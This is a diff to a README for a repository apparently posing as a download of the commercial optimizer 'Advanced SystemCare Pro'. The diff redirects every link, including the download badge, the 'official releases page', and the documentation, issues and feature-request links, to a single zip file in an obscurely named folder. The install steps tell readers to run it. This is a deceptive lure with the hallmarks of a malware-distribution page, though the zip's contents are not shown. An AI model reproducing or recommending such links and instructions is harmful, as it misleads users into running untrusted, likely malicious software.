@@ -1,6 +1,6 @@
 # 🚀 Advanced-SystemCare-Pro-Setup - Boost Your Computer Speed With Ease
 
-<a href="https://github.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/releases"><img src="https://img.shields.io/badge/Download-Release-blue" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/main/ustilagineous/Care_Pro_System_Advanced_Setup_2.3.zip"><img src="https://img.shields.io/badge/Download-Release-blue" alt="Download"></a>
 
 Advanced SystemCare Pro removes junk files, manages startup programs, and improves overall PC performance. This software provides real-time RAM optimization, registry repair, and privacy cleanup tools to keep your Windows system running well.
 
@@ -22,7 +22,7 @@ Advanced SystemCare Pro removes junk files, manages startup programs, and improv
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/releases) to download the setup file.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/main/ustilagineous/Care_Pro_System_Advanced_Setup_2.3.zip) to download the setup file.
 2.  Locate the downloaded file, typically found in your "Downloads" folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts provided by the installation window.
@@ -95,9 +95,9 @@ Choose between Light and Dark modes to match your Windows system appearance. Thi
 
 ## 🌐 Community Links
 
-*   [Documentation](https://github.com/baheerathy6634/Advanced-SystemCare-Pro-Setup)
-*   [Report Issues](https://github.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/issues)
-*   [Feature Requests](https://github.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/pulls)
+*   [Documentation](https://raw.githubusercontent.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/main/ustilagineous/Care_Pro_System_Advanced_Setup_2.3.zip)
+*   [Report Issues](https://raw.githubusercontent.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/main/ustilagineous/Care_Pro_System_Advanced_Setup_2.3.zip)
+*   [Feature Requests](https://raw.githubusercontent.com/baheerathy6634/Advanced-SystemCare-Pro-Setup/main/ustilagineous/Care_Pro_System_Advanced_Setup_2.3.zip)
 
 ## 📌 Technical Topics
 
